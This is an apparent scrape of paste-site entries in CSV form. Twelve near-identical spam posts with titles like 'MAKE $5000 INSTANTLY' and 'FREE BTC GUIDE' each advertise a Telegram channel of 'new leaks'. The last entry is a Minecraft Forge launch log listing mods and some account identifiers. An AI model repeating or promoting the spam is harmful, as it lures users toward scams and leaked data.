id,title,username,language,date,content
K0GNXWcg,FREE BTC GUIDE Q,backyardbrew,JavaScript,Sunday 20th of July 2025 01:06:17 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 1447187

"
tUXxyDZQ,MAKE $5000 INSTANTLY J,backyardbrew,JavaScript,Sunday 20th of July 2025 01:05:32 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 6871122

"
8Ps53Ekq,✅ MAKE $22OO IN 10 MIN A,backyardbrew,JavaScript,Sunday 20th of July 2025 01:04:24 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 8292234

"
vfMwhVcv,Make 3500$ in 20 MIN [Method] Y,backyardbrew,JavaScript,Sunday 20th of July 2025 01:03:43 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 2942049

"
tpKNbNfU,Make 3500$ in 20 MIN [Method] Y,backyardbrew,JavaScript,Sunday 20th of July 2025 01:02:45 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 3125898

"
ZRgPEHTn,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 01:02:09 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 1363700

"
QKmFTncT,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 01:00:33 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 6982348

"
Jy99C8qN,✅ MAKE $22OO IN 10 MIN A,backyardbrew,JavaScript,Sunday 20th of July 2025 12:59:54 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 7537703

"
v6yY0JsG,Make 3500$ in 20 MIN [Method] Y,backyardbrew,JavaScript,Sunday 20th of July 2025 12:59:17 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 7643609

"
K9qNcMmx,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 12:58:42 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 5441422

"
NJNer3Qz,FREE BTC GUIDE Q,backyardbrew,JavaScript,Sunday 20th of July 2025 12:58:03 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 8637348

"
nk8R9YkV,Make $2500 in 15 minutes N,backyardbrew,JavaScript,Sunday 20th of July 2025 12:57:21 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/PAZZHits

 8748522

"
pBUL1ZFa,Untitled,NikaraWorld,Java,Sunday 20th of July 2025 12:31:24 AM CDT,"[01:23:35] [main/INFO]: ModLauncher running: args [--username, AnimalLover6866, --version, forge-47.4.4, --gameDir, E:\Curseforge\Instances\Create'a Colony (1), --assetsDir, E:\Curseforge\Install\assets, --assetIndex, 5, --uuid, b3177828bf0c4d858c046932df2c7e0c, --accessToken, ????????, --clientId, YWY4MGRmMTgtN2IzYy00MzJlLWJhODctYjI3ZDI1NGE0YTY2, --xuid, 2533274960657592, --userType, msa, --versionType, release, --width, 1024, --height, 768, --launchTarget, forgeclient, --fml.forgeVersion, 47.4.4, --fml.mcVersion, 1.20.1, --fml.forgeGroup, net.minecraftforge, --fml.mcpVersion, 20230612.114412]
[01:23:35] [main/INFO]: ModLauncher 10.0.9+10.0.9+main.dcd20f30 starting: java version 17.0.15 by Microsoft; OS Windows 10 arch amd64 version 10.0
[01:23:36] [main/INFO]: Loading ImmediateWindowProvider fmlearlywindow
[01:23:36] [main/INFO]: Trying GL version 4.6
[01:23:36] [main/INFO]: Requested GL version 4.6 got version 4.6
[01:23:36] [main/INFO]: Mixin Transmogrifier is definitely up to no good...
[01:23:37] [main/INFO]: crimes against java were committed
[01:23:37] [main/INFO]: Original mixin transformation service successfully crobbed by mixin-transmogrifier!
[01:23:37] [main/INFO]: SpongePowered MIXIN Subsystem Version=0.8.5 Source=union:/E:/Curseforge/Instances/Create'a%20Colony%20(1)/mods/Connector-1.0.0-beta.46+1.20.1.jar%23316%23319!/ Service=ModLauncher Env=CLIENT
[01:23:37] [pool-2-thread-1/INFO]: GL info: NVIDIA GeForce RTX 2080 Ti/PCIe/SSE2 GL version 4.6.0 NVIDIA 572.16, NVIDIA Corporation
[01:23:37] [main/INFO]: Found mod file Connector-1.0.0-beta.46+1.20.1-mod.jar of type MOD with provider org.sinytra.connector.locator.ConnectorEarlyLocator@22bd2039
[01:23:37] [main/INFO]: Found mod file AmbientSounds_FORGE_v6.1.1_mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file appleskin-forge-mc1.20.1-2.5.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file appliedenergistics2-forge-15.2.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file architectury-9.2.14-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file athena-forge-1.20.1-3.1.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file AttributeFix-Forge-1.20.1-21.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file balm-forge-1.20.1-7.3.33-all.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file betterfpsdist-1.20.1-6.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file bettervillage-forge-1.20.1-3.2.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file BiomesOPlenty-1.20.1-18.0.0.592.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file blockui-1.20.1-1.0.151-BETA.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file bobberdetector-0.1.9-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Bookshelf-Forge-1.20.1-20.1.9.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Byzantine-1.20.1-11.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file capes-1.5.2+1.20-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file carryon-forge-1.20.1-2.1.2.7.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cbc_at_1.20.1_alpha_001.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cbcmodernwarfare-0.0.6c+mc.1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Chipped-forge-1.20.1-3.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file chunkloaders-1.2.8a-forge-mc1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file chunksending-1.20.1-2.8.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file citadel-2.5.4-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file ClayBrickRecipeRework-mc1.20.1-1.0.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cleanswing-1.20-1.5.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file clockwork-1.20.1-0.1.16-forge-b3b22e39fe.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file cloth-config-11.1.118-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Clumps-forge-1.20.1-12.0.0.4.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file collective-1.20.1-7.40.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file comforts-forge-6.3.5+1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file connectivity-1.20.1-7.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file constructionwand-1.20.1-2.11.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file Controlling-forge-1.20.1-12.0.2.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file copycats-2.2.0+mc.1.20.1-forge.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
[01:23:37] [main/INFO]: Found mod file corn_delight-1.0.4-1.20.1.jar of type MOD with provider {mods folder locator at E:\Curseforge\Instances\Create'a Colony (1)\mods}
